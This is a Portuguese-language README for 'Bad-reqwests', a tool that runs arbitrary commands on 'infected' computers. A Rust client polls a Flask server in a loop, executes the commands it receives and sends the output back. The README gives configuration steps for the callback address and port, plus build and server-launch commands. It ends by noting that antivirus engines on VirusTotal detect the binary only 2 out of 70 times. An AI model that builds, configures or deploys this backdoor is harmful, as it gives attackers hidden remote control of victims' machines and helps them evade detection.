## BAD-REQWESTS

### `description`
____________________________________________________________________________________________________

Bad-reqwests foi um projeto criado com a ideia de executar comando arbitrário em computadores usando de intermédio um servidor web.
A maquina infectada entrará em loop infinito de requests. O get recebido no svflask.py ira spawnar um input resultando no client aguardando até que o conteúdo seja exibido no body da aplicação, após o return do input irá executar o response e enviar o output para o server pelo metodo post.
____________________________________________________________________________________________________

### `requeriments`

* `cargo` https://www.rust-lang.org/
* `git`  (clone esse repositorio)
* `pip` https://www.python.org/
```
pip3 install -r requeriments.txt
```
____________________________________________________________________________________________________
### `config.sh`
```
chmod +x config.sh
```
```             
      --windows        
      --unix        *    (default)
      --addr         
      --port         
         
Exemplo: ./config.sh --windows --addr 192.168.1.100 --port 8080
```
____________________________________________________________________________________________________
### `build`
```
cargo b --release
```

path do binário `target/release`
____________________________________________________________________________________________________
### `server`
```
python3 svflask.py
```

____________________________________________________________________________________________________
`VirusTotal !! ⚠️ 2/70` `->`

https://www.virustotal.com/gui/file/7c907e0079548e4adcc4d65480dcf1d4fecae18deb4fef96295a79ac127300df?nocache=1
